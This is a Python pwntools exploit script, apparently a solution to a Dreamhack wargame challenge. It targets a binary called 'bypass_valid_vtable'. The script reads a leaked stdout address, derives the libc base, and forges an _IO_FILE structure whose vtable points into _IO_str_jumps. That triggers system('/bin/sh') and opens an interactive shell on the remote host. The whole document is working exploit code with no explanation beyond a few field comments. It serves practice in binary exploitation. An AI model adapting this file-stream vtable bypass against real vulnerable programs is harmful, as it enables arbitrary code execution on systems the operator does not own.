#!/usr/bin/env python3

from pwn import *

exe = ELF("./bypass_valid_vtable_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
#p = process()
p = remote('host3.dreamhack.games', 20594)
p.recvuntil(b'stdout: ')
leak = int(p.recvline()[:-1],16)
print("stdout: ",hex(leak))
libc.address = leak - libc.sym._IO_2_1_stdout_
io_files_jumps = libc.address + 0x3e82a0
io_str_overflow = io_files_jumps + 0xd8
fake_vtable = io_str_overflow -  16
bin_sh = next(libc.search('/bin/sh\x00'))

system = libc.sym.system
fp = exe.sym.fp

payload = p64(0x0) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64((int((bin_sh - 100) / 2))) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(0x0) # _IO_buf_base
payload += p64((bin_sh)) # _IO_buf_end
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(fp + 0x80) # _lock -> write 가능한 영역을 지정
payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite
payload += p64(system) # fp->_s._allocate_buffer RIP
p.sendline(payload)

p.interactive()
